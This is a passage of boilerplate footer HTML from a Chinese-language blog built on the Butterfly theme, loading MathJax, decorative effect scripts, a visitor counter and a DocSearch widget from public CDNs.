id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="docsearch-wrap"><div id="docsearch" style="display:none"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@docsearch/css/dist/style.min.css"/><script src="https://cdn.jsdelivr.net/npm/@docsearch/js/dist/umd/index.min.js"></script><script>(() => {
  docsearch(Object.assign({
    appId: '',
    apiKey: '',
    indexName: '',
    container: '#docsearch',
  }, null))

  const handleClick = () => {
    document.querySelector('.DocSearch-Button').click()
  }

  const searchClickFn = () => {
    btf.addEventListenerPjax(document.querySelector('#search-button > .search'), 'click', handleClick)
  }

  searchClickFn()
  window.addEventListener('pjax:complete', searchClickFn)
})()</script></div></div></body></html>